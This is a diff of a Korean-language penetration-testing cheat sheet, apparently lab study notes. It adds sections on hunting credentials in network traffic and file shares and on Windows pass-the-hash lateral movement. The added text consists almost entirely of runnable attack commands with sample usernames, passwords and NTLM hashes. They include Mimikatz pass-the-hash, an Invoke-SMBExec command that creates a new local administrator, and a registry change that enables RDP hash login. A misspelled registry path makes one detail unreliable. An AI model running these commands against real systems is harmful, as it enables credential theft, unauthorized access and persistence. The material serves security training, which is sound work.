@@ -422,3 +422,84 @@ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 ### Browsers - LaZagne
 ```python3 laZagne.py browsers```
 
+<br/><br/>
+# 7. Extracting Passwords from the Network
+
+## Credential Hunting in Network Traffic
+
+### Pcredz
+- [Pcredz](https://github.com/lgandx/PCredz)는 실시간 트래픽이나 네트워크 패킷 캡처에서 자격 증명을 추출하는 데 사용<br/>
+```
+$ apt install python3-pip && sudo apt install libpcap-dev && sudo apt install file && pip3 install Cython && pip3 install python-libpcap
+$ git clone https://github.com/lgandx/PCredz.git
+$ ./Pcredz -f ../demo.pcapng -t -v
+```
+
+<br/><br/>
+## Credential Hunting in Network Shares
+
+### PowerShell(Windows)
+````Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern "passw"```<br/>
+
+### Snaffler(Windows)
+- [Snaffler](https://github.com/SnaffCon/Snaffler)는 도메인에 가입된 컴퓨터에서 실행될 때 접근 가능한 네트워크 공유를 자동으로 식별<br/>
+```c:\Users\Public>Snaffler.exe -s -u```<br/>
+
+### PowerHuntShares(Windows)
+- [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares는 도메인에 가입된 컴퓨터에서 실행할 필요가 없는 PowerShell 스크립트<br/>
+```
+PS> Set-ExecutionPolicy -Scope Process Bypass
+PS> Import-Module .\PowerHuntShares.psm1
+PS> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+```
+
+### MANSPIDER(Linux)
+- [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER)는 도메인에 가입된 컴퓨터에 접근할 수 없거나 원격으로 파일을 검색하고 싶은 경우 사용<br/>
+```$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'```<br/>
+
+### NetExec(Linux)
+- `--spider`, `-M spider_plus` 옵션을 사용하여 네트워크 공유를 검색하는데 사용<br/>
+```$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"```<br/>
+```$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' -M spider_plus```<br/>
+
+<br/><br/>
+# 8. Windows Lateral Movement
+
+## Pass the Hash(PtH)
+
+### Pass the Hash with Mimikatz(Windows)
+```c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit```<br/>
+
+### Pass the Hash with PowerShell Invoke-TheHash(Windows)
+- [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)는 WMI 및 SMB로 해시 패스 공격을 수행하기 위한 PowerShell 함수 모음<br/>
+```
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+```
+
+### Pass the Hash with Impacket(Linux)
+```$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453```<br/>
+- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
+- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
+- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)
+
+### Pass the Hash with CrackMapExec(Linux)
+```$ crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453```<br/>
+- 로컬 관리자 시도 : ```$ crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 --local-auth```<br/>
+- 명령 실행 : ```$ crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami```
+
+### Pass the Hash with evil-winrm(Linux)
+```$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453```<br/>
+> 도메인 계정을 사용하는 경우 도메인 이름(예 : administrator@inlanefreight.htb)을 포함해야 함
+
+### Pass the Hash with RDP(Linux)
+- `Restricted Admin Mode` 활성화 필요
+```c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f```<br/>
+```$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B```
+
+### UAC Limits Pass the Hash for Local Accounts
+- `HKLM\SWOREATE\Microsoft\Windows\CurrentVersion\Policys\System\LocalAccountTokenFilterPolicy`가 0으로 설정되어 있으면 내장된 로컬 관리자 계정(RID-500, "Administrator")이 원격 관리 작업을 수행할 수 있는 유일한 로컬 계정임<br/>
+- 1로 설정하면 다른 로컬 관리자도 사용할 수 있음
+> `FilterAdministratorToken`(기본적으로 비활성화됨)이 활성화된 경우(값 1), RID-500 계정(Administrator)이 UAC 보호
+
+
